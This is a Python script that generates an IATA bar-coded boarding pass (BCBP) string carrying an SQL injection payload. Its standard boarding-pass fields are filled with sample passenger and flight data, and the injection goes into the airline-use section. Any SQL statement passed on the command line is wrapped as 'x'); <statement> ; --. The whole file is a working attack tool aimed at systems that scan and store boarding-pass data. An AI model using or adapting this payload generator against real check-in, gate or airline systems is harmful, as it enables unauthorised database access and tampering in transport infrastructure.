#!/usr/bin/env python3
# build_bcbp.py — BCBP airline-use SQLi payload generator
import sys, json

def build(au: str) -> str:
    mandatory = ("M1"
                 "DESMARAIS/LUC       "   # item 1: name, 20 ch
                 "E"                      # item 2: e-ticket
                 "ABC123 "                # item 3: PNR, 7 ch
                 "YUL" "FRA"              # items 4/5: from/to
                 "AC "                    # item 6a: carrier, 3 ch
                 "0834 "                  # flight number, 5 ch
                 "226"                    # julian date
                 "F"                      # compartment
                 "001A"                   # seat
                 "0025 "                  # sequence, 5 ch
                 "1")                     # passenger status
    assert len(mandatory) == 58, len(mandatory)

    unique = ("5"                          # version number
              "0B"                         # item 10: unique cond size = 11
              "0"                          # item 15: passenger desc (adult)
              "W"                          # item 12: source of check-in
              "W"                          # item 14: source of issuance
              "0226"                       # item 22: date of issue
              "B"                          # item 16: document type (B!)
              "AC ")                       # item 21: issuer, 3 ch
    assert len(unique) == 14

    repeated = ("12"                       # item 17: repeated size = 18
                "014"                      # item 4a: airline numeric code
                "0000001234"               # item 4b: serial, 10 ch
                " "                        # item 5: selectee
                " "                        # item 6: intl doc verification
                "AC ")                     # item 8: marketing carrier
    assert len(repeated) == 20

    tail = ">" + unique + repeated + au
    item6 = format(len(tail), "02X")
    if len(tail) > 255:
        raise ValueError(f"variable section {len(tail)} > 255, shorten au")
    return mandatory + item6 + tail

au = "x'); SELECT 1; -- "
if len(sys.argv) > 1:
    au = "x'); " + sys.argv[1] + " ; -- "

raw = build(au)
print(json.dumps({"raw": raw}))
print(f"# variable section: {len(raw)-60} bytes, item6={raw[58:60]}", file=sys.stderr)
